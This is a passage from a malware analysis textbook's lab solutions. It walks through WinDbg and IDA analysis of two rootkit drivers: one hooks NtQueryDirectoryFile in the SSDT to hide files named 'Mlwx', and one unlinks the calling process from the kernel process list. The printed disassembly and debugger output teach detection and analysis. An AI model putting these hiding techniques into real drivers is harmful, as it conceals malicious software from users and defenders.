  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4a6 ff7510 push dword ptr [ebp+10h]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4a9 ff750c push dword ptr [ebp+0Ch]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4ac ff7508 push dword ptr [ebp+8]
  prefs: []
  type: TYPE_NORMAL
- en: 'f7c4d4af e860000000 call Mlwx486+0x514 (f7c4d514) *Listing 10-10L: Assembly
    listing of PatchFunction*'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*It’s probably not completely clear from Listing 10-10L that the function being
    called is* *NtQueryDirectoryFile. However, if we single-step over the call function,
    we see that it* *goes to another section of the file that jumps to NtQueryDirectoryFile.
    In IDA Pro, this* *call would have been labeled NtQueryDirectoryFile, but the
    disassembler included in* *WinDbg is much less sophisticated. Ideally, we would
    have the file to view in IDA Pro* *while we are debugging, but we can’t find this
    file because it’s hidden.*'
  prefs: []
  type: TYPE_NORMAL
- en: The PatchFunction checks the eighth parameter, FileInformationClass, and if
    it is any value other than 3, it returns NtQueryDirectoryFile’s original return
    value. It also checks the return value from NtQueryDirectoryFile and the value
    of the ninth parameter, ReturnSingleEntry. PatchFunction is looking for certain
    parameters. If the parameters don’t meet the criteria, then the functionality
    **10**
  prefs: []
  type: TYPE_NORMAL
- en: is exactly the same as the original NtQueryDirectoryFile. If the parameters
    do meet the criteria, PatchFunction will change the return value, which is what
    we’re interested in. To examine what happens during a call to PatchFunction with
    the correct parameters, we set a breakpoint on PatchFunction.
  prefs: []
  type: TYPE_NORMAL
- en: 'If we set a breakpoint on PatchFunction, it will break every time the function
    is called, but we’re interested in only some of the function calls. This is the
    perfect time to use a conditional breakpoint so that the breakpoint is hit only
    when the parameters to PatchFunction match our criteria. We set a breakpoint on
    PatchFunction, but the breakpoint will be hit only if the value of ReturnSingleEntry
    is 0, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **bp f7c4d486 ".if dwo(esp+0x24)==0 {} .else {gc}"**
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you have Windows Explorer open in a directory, you might see this breakpoint
    hit* *over and over again in different threads, which could be annoying while
    you’re trying* *to analyze the function. To make it easier to analyze, you should
    close all of your Windows Explorer windows and use the dir command at a command
    line to trigger the* *breakpoint.*'
  prefs: []
  type: TYPE_NORMAL
- en: Once the code filters out interesting calls, we see another function stored
    at offset 0xf7c4d590\. Although it isn’t automatically labeled by WinDbg, we can
    determine that it is RtlCompareMemory by looking at the disassembly or stepping
    into the function call. The code in Listing 10-11L
  prefs: []
  type: TYPE_NORMAL
- en: shows the call to RtlCompareMemory at .
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4ca 6a08 push 8
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4cc 681ad5c4f7 push offset Mlwx486+0x51a (f7c4d51a) f7c4d4d1 8d465e lea
    eax,[esi+5Eh]
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4d4 50 push eax
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4d5 32db xor bl,bl
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4d7 ff1590d5c4f7 call dword ptr [Mlwx486+0x590 (f7c4d590)]
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**557**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d4dd 83f808 cmp eax,8
  prefs: []
  type: TYPE_NORMAL
- en: 'f7c4d4e0 7512 jne Mlwx486+0x4f4 (f7c4d4f4) *Listing 10-11L: Comparison of the
    filename to determine whether the rootkit will modify the* *returned information
    from NtQueryDirectoryFile*'
  prefs: []
  type: TYPE_NORMAL
- en: We can now see what PatchFunction is comparing. As shown in Listing 10-11L,
    the first parameter to RtlCompareMemory is eax, which stores the offset at esi+5eh
    at , which is the offset to a filename. Earlier in our disassembly, we saw that
    esi was FileInformation, which contains the information filled in by NtQueryDirectoryFile.
    Examining the documentation for NtQueryDirectoryFile, we see that this is a FILE_BOTH_DIR_INFORMATION
    structure, and that an offset of 0x5E is where the filename is stored as a wide
    character string. (We could also use WinDbg to tell us what is stored there.)
  prefs: []
  type: TYPE_NORMAL
- en: To see what is stored at location esi+5eh, we use the db command, as shown in
    Listing 10-12L. This reveals that the filename is *Installer.h*.
  prefs: []
  type: TYPE_NORMAL
- en: kd> **db esi+5e**
  prefs: []
  type: TYPE_NORMAL
- en: 036a302e 49 00 6e 00 73 00 74 00-61 00 6c 00 6c 00 65 00 **I.n.s.t.a.l.l.e**.
  prefs: []
  type: TYPE_NORMAL
- en: 036a303e 72 00 68 00 00 00 00 00-00 00 f6 bb be f0 6e 70 **r.h**...........np
    036a304e c7 01 47 c0 db 46 25 75-cb 01 50 1e c1 f0 6e 70 ..G..F%u..P...np 036a305e
    c7 01 50 1e c1 f0 6e 70-c7 01 00 00 00 00 00 00 ..P...np........
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-12L: Examining the first argument to RtlCompareMemory* The other
    operand of the comparison is the fixed location f7c4d51a, and we can use the db
    command to view that as well. Listing 10-13L shows that the second parameter to
    RtlCompareMemory stores the letters *Mlwx*, which reminds us of the driver *Mlwx486.sys*.'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **db f7c4d51a**
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d51a 4d 00 6c 00 77 00 78 00-00 00 00 00 00 00 00 00 **M.l.w.x**.........
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d52a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
  prefs: []
  type: TYPE_NORMAL
- en: f7c4d53a 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-13L: Examining the second argument to RtlCompareMemory* The call
    to RtlCompareMemory specifies a size of 8 bytes, which represents four characters
    in wide character strings. The code is comparing every file to see if it starts
    with the four characters *Mlwx*. We now have a pretty good idea that this driver
    is hiding files that begin with *Mlwx*.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Hiding Files**'
  prefs: []
  type: TYPE_NORMAL
- en: Having discovered which filenames PatchFunction will operate on, we analyze
    how it will change the return values of NtQueryDirectoryFile. Examining the documentation
    for NtQueryDirectoryFile, we see the FileInformation structure with a series of
    FILE_BOTH_DIR_INFORMATION structures. The first field in the FILE_BOTH_DIR_INFORMATION
    structure is the offset that points to the next FILE_BOTH_DIR_INFORMATION. As
    shown in Figure 10-2L, PatchFunction manipulates this field to hide certain files
    from the directory listing by moving the **558**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: offset forward to point to the next entry if the current entry has a filename
    beginning with *Mlwx*.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-2L shows what the return value of NtQueryDirectoryFile looks like
    for a directory that contains three files. There is one FILE_BOTH_DIR_INFORMATION
  prefs: []
  type: TYPE_NORMAL
- en: structure for each file. Normally, the first structure would point to the second,
    and the second would point to the third, but the rootkit has modified the structure
    so that the first structure points to the third, thereby hiding the middle structure.
    This trick ensures that any files that begin with *Mlwx* are skipped and hidden
    from directory listings.
  prefs: []
  type: TYPE_NORMAL
- en: FILE_BOTH_DIR_INFORMATION
  prefs: []
  type: TYPE_NORMAL
- en: FILE_BOTH_DIR_INFORMATION
  prefs: []
  type: TYPE_NORMAL
- en: FILE_BOTH_DIR_INFORMATION
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-2L: A series of FILE_BOTH_DIR_INFORMATION structures being* *modified
    so that the middle structure is hidden*'
  prefs: []
  type: TYPE_NORMAL
- en: '**Recovering the Hidden File**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Having identified the program that is hiding files, we can try to obtain the
    original file used by the driver in order to perform additional analysis. There
    are several ways to do this:'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Disable the service that starts the driver and reboot. When you reboot, the
    code won’t be running and the file won’t be hidden.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Extract the file from the resource section of the executable file that installed
    it.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: Access the file even though it’s not available in the directory listing.
  prefs: []
  type: TYPE_NORMAL
- en: The hook to NtQueryDirectoryFile prevents the file from being shown in a directory
    listing, but the file still exists. For example, you could copy the file using
    the DOS command copy Mlwx486.sys NewFilename.sys. The *NewFilename.sys* file would
    not be hidden.
  prefs: []
  type: TYPE_NORMAL
- en: All of these options are simple enough, but the first is the best because it
    disables the driver. With the driver disabled, you should first search your system
    for files beginning with *Mlwx* in case there are other files being hidden by
    the *Mlwx486.sys* driver. (There are none in this case.) Opening *Mlwx486.sys*
    in IDA Pro, we see that it is very small, so we should analyze all of it to make
    sure that the driver isn’t doing anything else that we’re not aware of. We see
    that the DriverEntry routine calls RtlInitUnicodeString with KeServiceDescriptorTable
    and NtQueryDirectoryFile, and then calls MmGetSystemRoutineAddress to find the
    offsets for those two addresses. It next looks for the entry in the SSDT for NtQueryDirectoryFile
    Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**559**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: and overwrites that entry with the address of the PatchFunction. It doesn’t
    create a device, and it doesn’t add any function handlers to the driver object.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 10-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The user-space program loads the driver and then pops up an advertisement every
    30 seconds. The driver hides the process by unlinking the Process Environment
    Block (PEB) from the system’s linked list.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Once this program is running, there is no easy way to stop it without rebooting.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The kernel component responds to any DeviceIoControl request by unlinking the
    process that made the request from the linked list of processes in order to hide
    the process from the user.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'We begin with some basic static analysis on the files. When we analyze the
    driver file, we see the following imports:'
  prefs: []
  type: TYPE_NORMAL
- en: IofCompleteRequest
  prefs: []
  type: TYPE_NORMAL
- en: IoDeleteDevice
  prefs: []
  type: TYPE_NORMAL
- en: IoDeleteSymbolicLink
  prefs: []
  type: TYPE_NORMAL
- en: RtlInitUnicodeString
  prefs: []
  type: TYPE_NORMAL
- en: '**IoGetCurrentProcess**'
  prefs: []
  type: TYPE_NORMAL
- en: IoCreateSymbolicLink
  prefs: []
  type: TYPE_NORMAL
- en: IoCreateDevice
  prefs: []
  type: TYPE_NORMAL
- en: KeTickCount
  prefs: []
  type: TYPE_NORMAL
- en: The import for IoGetCurrentProcess is the only one that provides much information.
    (The other imports are simply required by any driver that creates a device that
    is accessible from user space.) The call to IoGetCurrentProcess tells us that
    this driver either modifies the running process or requires information about
    it.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we copy the driver file into *C:\Windows\System32* and double-click the
    executable to run it. We see a pop-up ad, which is the same as the one in Lab
    7-2\. We now examine what it did to our system. First, we check to see if the
    service was successfully installed and verify that the malicious *.sys* file is
    used as part of the service. Simultaneously, we notice that after about 30 seconds,
    the program pops up the advertisement again and does so about once every 30 seconds.
    Opening Task Manager in an effort to terminate the program, we see that the program
    isn’t listed. And it’s not listed in Process Explorer either.
  prefs: []
  type: TYPE_NORMAL
- en: The program continues to open advertisements, and there’s no easy way to stop
    it. It’s not in a process listing, so we can’t stop it by killing the process.
  prefs: []
  type: TYPE_NORMAL
- en: Nor can we attach a debugger to the process because the program doesn’t show
    up in the process listing for WinDbg or OllyDbg. At this point, our only **560**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: choice is to revert to our most recent snapshot or reboot and hope that the
    program isn’t persistent. It’s not, so a reboot stops it.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analyzing the Executable in IDA Pro**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Now to IDA Pro. Navigating to WinMain and examining the functions it calls,
    we see the following:'
  prefs: []
  type: TYPE_NORMAL
- en: OpenSCManager
  prefs: []
  type: TYPE_NORMAL
- en: CreateService
  prefs: []
  type: TYPE_NORMAL
- en: StartService
  prefs: []
  type: TYPE_NORMAL
- en: CloseServiceHandle
  prefs: []
  type: TYPE_NORMAL
- en: CreateFile
  prefs: []
  type: TYPE_NORMAL
- en: DeviceIoControl
  prefs: []
  type: TYPE_NORMAL
- en: OleInitialize
  prefs: []
  type: TYPE_NORMAL
- en: CoCreateInstance
  prefs: []
  type: TYPE_NORMAL
- en: VariantInit
  prefs: []
  type: TYPE_NORMAL
- en: SysAllocString
  prefs: []
  type: TYPE_NORMAL
- en: ecx+0x2c
  prefs: []
  type: TYPE_NORMAL
- en: Sleep
  prefs: []
  type: TYPE_NORMAL
- en: '**10**'
  prefs: []
  type: TYPE_NORMAL
- en: OleUninitialize
  prefs: []
  type: TYPE_NORMAL
- en: WinMain can be logically broken into two sections. The first section, consisting
    of OpenSCManager through DeviceIoControl, includes the functions to load and send
    a request to the kernel driver. The second section consists of the remaining functions,
    which show the usage of a COM object. At this point, we don’t know the target
    of the call to ecx+0x2c, but we’ll come back to that later.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the calls in detail, we see that the program creates a service called
    Process Helper, which loads the kernel driver *C:\Windows\System32\* *Lab10-03.sys*.
    It then starts the Process Helper service, which loads *Lab10-03.sys* into the
    kernel and opens a handle to *\\.\ProcHelper*, which opens a handle to the kernel
    device created by the ProcHelper driver.
  prefs: []
  type: TYPE_NORMAL
- en: We need to look carefully at the call to DeviceIoControl, shown in Listing 10-14L,
    because the input and output parameters passed as arguments to it will be sent
    to the kernel code, which we will need to analyze separately.
  prefs: []
  type: TYPE_NORMAL
- en: 0040108C lea ecx, [esp+2Ch+BytesReturned]
  prefs: []
  type: TYPE_NORMAL
- en: 00401090 push 0 ; lpOverlapped 00401092 push ecx ; lpBytesReturned 00401093
    push 0 ; nOutBufferSize 00401095 push
  prefs: []
  type: TYPE_NORMAL
- en: **0** ; lpOutBuffer
  prefs: []
  type: TYPE_NORMAL
- en: 00401097 push 0 ; nInBufferSize 00401099 push
  prefs: []
  type: TYPE_NORMAL
- en: **0** ; lpInBuffer
  prefs: []
  type: TYPE_NORMAL
- en: 0040109B push
  prefs: []
  type: TYPE_NORMAL
- en: 0ABCDEF01h ; dwIoControlCode
  prefs: []
  type: TYPE_NORMAL
- en: 004010A0 push eax ; hDevice 004010A1 call ds:DeviceIoControl
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-14L: A call to DeviceIoControl in* Lab10-03.exe *to pass a request
    to the* Lab10-03.sys *driver*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**561**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Notice that the call to DeviceIoControl has lpOutBuffer at  and lpInBuffer
    at  set to NULL. This is unusual, and it means that this request sends no information
    to the kernel driver and that the kernel driver sends no information back. Also
    notice that the dwIoControlCode of 0xABCDEF01 at  is passed to the kernel driver.
    We’ll revisit this when we look at the kernel driver.
  prefs: []
  type: TYPE_NORMAL
- en: The remainder of this file is nearly identical to the COM example in Lab 7-2,
    except that the call to the navigate function is inside a loop that runs continuously
    and sleeps for 30 seconds between each call.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analyzing the Driver**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we open the kernel file with IDA Pro. As shown in Listing 10-15L, we see
    that it calls IoCreateDevice at  to create a device named \Device\ProcHelper
    at .
  prefs: []
  type: TYPE_NORMAL
- en: 0001071A push offset aDeviceProchelp ; "\\Device\\ProcHelper"
  prefs: []
  type: TYPE_NORMAL
- en: 0001071F lea eax, [ebp+var_C]
  prefs: []
  type: TYPE_NORMAL
- en: 00010722 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00010723 call edi ; RtlInitUnicodeString
  prefs: []
  type: TYPE_NORMAL
- en: 00010725 mov esi, [ebp+arg_0]
  prefs: []
  type: TYPE_NORMAL
- en: 00010728 lea eax, [ebp+var_4]
  prefs: []
  type: TYPE_NORMAL
- en: 0001072B push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0001072C push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0001072E push 100h
  prefs: []
  type: TYPE_NORMAL
- en: 00010733 push 22h
  prefs: []
  type: TYPE_NORMAL
- en: 00010735 lea eax, [ebp+var_C]
  prefs: []
  type: TYPE_NORMAL
- en: 00010738 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00010739 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0001073B push esi
  prefs: []
  type: TYPE_NORMAL
- en: 0001073C call ds:IoCreateDevice
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-15L:* Lab10-03.sys *creating a device that is accessible from user
    space* As shown in Listing 10-16L, the function then calls IoCreateSymbolicLink
    at  to create a symbolic link named \DosDevices\ProcHelper at  for the user-space
    program to access.'
  prefs: []
  type: TYPE_NORMAL
- en: 00010751 push offset aDosdevicesPr_0 ; "\\DosDevices\\ProcHelper"
  prefs: []
  type: TYPE_NORMAL
- en: 00010756 lea eax, [ebp+var_14]
  prefs: []
  type: TYPE_NORMAL
- en: 00010759 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0001075A mov dword ptr [esi+70h], offset loc_10666
  prefs: []
  type: TYPE_NORMAL
- en: 00010761 mov dword ptr [esi+34h], offset loc_1062A 00010768 call edi ; RtlInitUnicodeString
  prefs: []
  type: TYPE_NORMAL
- en: 0001076A lea eax, [ebp+var_C]
  prefs: []
  type: TYPE_NORMAL
- en: 0001076D push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0001076E lea eax, [ebp+var_14]
  prefs: []
  type: TYPE_NORMAL
- en: 00010771 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00010772 call ds:IoCreateSymbolicLink
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-16L:* Lab10-03.sys *creating a symbolic link to make it easier
    for user-space applications to access a handle to the device*'
  prefs: []
  type: TYPE_NORMAL
- en: '**562**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Finding the Driver in Memory with WinDbg** We can either run the malware
    or just start the service to load our kernel driver into memory. We know that
    the device object is at \Device\ProcHelper, so we start with it. In order to find
    the function in ProcHelper that is executed, we must find the driver object, which
    can be done with the !devobj command, as shown in Listing 10-17L. The output of
    !devobj tells us where the DriverObject at  is stored.'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **!devobj ProcHelper**
  prefs: []
  type: TYPE_NORMAL
- en: 'Device object (82af64d0) is for:'
  prefs: []
  type: TYPE_NORMAL
- en: ProcHelper \Driver\Process Helper DriverObject 82716a98
  prefs: []
  type: TYPE_NORMAL
- en: Current Irp 00000000 RefCount 1 Type 00000022 Flags 00000040
  prefs: []
  type: TYPE_NORMAL
- en: Dacl e15b15cc DevExt 00000000 DevObjExt 82af6588
  prefs: []
  type: TYPE_NORMAL
- en: ExtensionFlags (0000000000)
  prefs: []
  type: TYPE_NORMAL
- en: Device queue is not busy.
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-17L: Finding the device object for the ProcHelper driver* **10**'
  prefs: []
  type: TYPE_NORMAL
- en: The DriverObject contains pointers to all of the functions that will be called
    when a user-space program accesses the device object. The DriverObject is stored
    in a data structure called DRIVER_OBJECT. We can use the dt command to view the
    driver object with labels, as shown in Listing 10-18L.
  prefs: []
  type: TYPE_NORMAL
- en: kd> **dt nt!_DRIVER_OBJECT 82716a98**
  prefs: []
  type: TYPE_NORMAL
- en: '+0x000 Type : 4'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x002 Size : 168'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x004 DeviceObject : 0x82af64d0 _DEVICE_OBJECT'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x008 Flags : 0x12'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x00c DriverStart : 0xf7c26000'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x010 DriverSize : 0xe00'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x014 DriverSection : 0x827bd598'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x018 DriverExtension : 0x82716b40 _DRIVER_EXTENSION'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x01c DriverName : _UNICODE_STRING "\Driver\Process Helper"'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x028 FastIoDispatch : (null)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x02c **DriverInit** : 0xf7c267cd long +0'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x030 DriverStartIo : (null)'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x034 **DriverUnload** : 0xf7c2662a void +0'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x038 MajorFunction : [28] 0xf7c26606 long +0'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-18L: Examining the driver object for* Lab10-03.sys *using WinDbg*
    This code contains several function pointers of note. These include DriverInit,
    the DriverEntry routine we analyzed in IDA Pro, and DriverUnload, which is called
    when this driver is unloaded. When we look at DriverUnload in IDA Pro, we see
    that it deletes the symbolic link and the device created by the DriverEntry program.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**563**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Analyzing the Functions of the Major Function Table** Next, we examine the
    major function table, which is often where the most interesting driver code is
    implemented. Windows XP allows 0x1C possible major function codes, so we view
    the entries in the major function table using the dd command:'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **dd 82716a98+0x38 L1C**
  prefs: []
  type: TYPE_NORMAL
- en: 82716ad0
  prefs: []
  type: TYPE_NORMAL
- en: f7c26606 804f354a f7c26606 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716ae0
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a 804f354a 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716af0
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a 804f354a 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716b00
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a f7c26666 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716b10
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a 804f354a 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716b20
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a 804f354a 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: 82716b30
  prefs: []
  type: TYPE_NORMAL
- en: 804f354a 804f354a 804f354a 804f354a
  prefs: []
  type: TYPE_NORMAL
- en: Each entry in the table represents a different type of request that the driver
    can handle, but as you can see, most of the entries in the table are for the same
    function at 0X804F354A. All of the entries in the table with the value 0X804F354A
    represent a request type that the driver does not handle.
  prefs: []
  type: TYPE_NORMAL
- en: 'To verify this, we need to find out what that function does. We could view
    its disassembly, but because it’s a Windows function, its name should tell us
    what it does, as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: kd> **ln 804f354a**
  prefs: []
  type: TYPE_NORMAL
- en: (804f354a) nt! **IopInvalidDeviceRequest** | (804f3580) nt!IopGetDeviceAttachmentBase
  prefs: []
  type: TYPE_NORMAL
- en: 'Exact matches:'
  prefs: []
  type: TYPE_NORMAL
- en: nt!IopInvalidDeviceRequest = <no type information> The function at 0X804F354A
    is named IopInvalidDeviceRequest, which means that it handles invalid requests
    that this driver doesn’t handle. The remaining functions from the major function
    table at offsets 0, 2, and 0xe contain the functionality that we are interested
    in. Examining *wdm.h*, we find that offsets of 0, 2, and 0xe store the functions
    for the Create, Close, and DeviceIoControl functions.
  prefs: []
  type: TYPE_NORMAL
- en: First, we look at the Create and Close functions at offsets 0 and 2 in the major
    function table. We notice that both entries in the major function table point
    to the same function (0xF7C26606). Looking at that function, we see that it simply
    calls IofCompleteRequest and then returns. This tells the OS that the request
    was successful, but does nothing else. The only remaining function in the major
    function table is the one that handles DeviceIoControl requests, which is the
    most interesting.
  prefs: []
  type: TYPE_NORMAL
- en: Looking at the DeviceIoControl function, we see that it manipulates the PEB
    of the current process. Listing 10-19L shows the code that handles DeviceIoControl.
  prefs: []
  type: TYPE_NORMAL
- en: 00010666 mov edi, edi
  prefs: []
  type: TYPE_NORMAL
- en: 00010668 push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00010669 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: '**564**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0001066B call ds:IoGetCurrentProcess 00010671 mov ecx, [eax+8Ch]
  prefs: []
  type: TYPE_NORMAL
- en: 00010677 add eax, 88h
  prefs: []
  type: TYPE_NORMAL
- en: 0001067C mov edx, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 0001067E mov [ecx], edx
  prefs: []
  type: TYPE_NORMAL
- en: 00010680 mov ecx, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 00010682 mov eax, [eax+4]
  prefs: []
  type: TYPE_NORMAL
- en: 00010685 mov [ecx+4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00010688 mov ecx, [ebp+Irp] ; Irp
  prefs: []
  type: TYPE_NORMAL
- en: 0001068B and dword ptr [ecx+18h], 0
  prefs: []
  type: TYPE_NORMAL
- en: 0001068F and dword ptr [ecx+1Ch], 0
  prefs: []
  type: TYPE_NORMAL
- en: 00010693 xor dl, dl ; PriorityBoost 00010695 call ds:IofCompleteRequest
  prefs: []
  type: TYPE_NORMAL
- en: 0001069B xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0001069D pop ebp
  prefs: []
  type: TYPE_NORMAL
- en: 0001069E retn 8
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-19L: The driver code that handles DeviceIoControl requests* The
    first thing the DeviceIoControl function does is call IoGetCurrentProcess **10**'
  prefs: []
  type: TYPE_NORMAL
- en: at , which returns the EPROCESS structure of the process that issued the call
    to DeviceIoControl. The function then accesses the data at an offset of 0x88
  prefs: []
  type: TYPE_NORMAL
- en: at , and then accesses the next DWORD at offset 0x8C at .
  prefs: []
  type: TYPE_NORMAL
- en: We use the dt command to discover that LIST_ENTRY is stored at offsets 0x88
    and 0x8C in the PEB structure, as shown in Listing 10-20L at .
  prefs: []
  type: TYPE_NORMAL
- en: kd> **dt nt!_EPROCESS**
  prefs: []
  type: TYPE_NORMAL
- en: '+0x000 Pcb : _KPROCESS'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x06c ProcessLock : _EX_PUSH_LOCK'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x070 CreateTime : _LARGE_INTEGER'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x078 ExitTime : _LARGE_INTEGER'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x080 RundownProtect : _EX_RUNDOWN_REF'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x084 UniqueProcessId : Ptr32 Void'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x088 ActiveProcessLinks : _LIST_ENTRY'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x090 QuotaUsage : [3] Uint4B'
  prefs: []
  type: TYPE_NORMAL
- en: '+0x09c QuotaPeak : [3] Uint4B'
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-20L: Examining the EPROCESS structure with WinDbg* Now that we
    know that function is accessing the LIST_ENTRY structure, we look closely at how
    LIST_ENTRY is being accessed. The LIST_ENTRY structure is a double-linked list
    with two values: the first is BLINK, which points to the previous entry in the
    list, and the second is FLINK, which points to the next entry in the list. We
    see that it is not only reading the LIST_ENTRY structure, but also changing structures,
    as shown in Listing 10-21L.'
  prefs: []
  type: TYPE_NORMAL
- en: '00010671'
  prefs: []
  type: TYPE_NORMAL
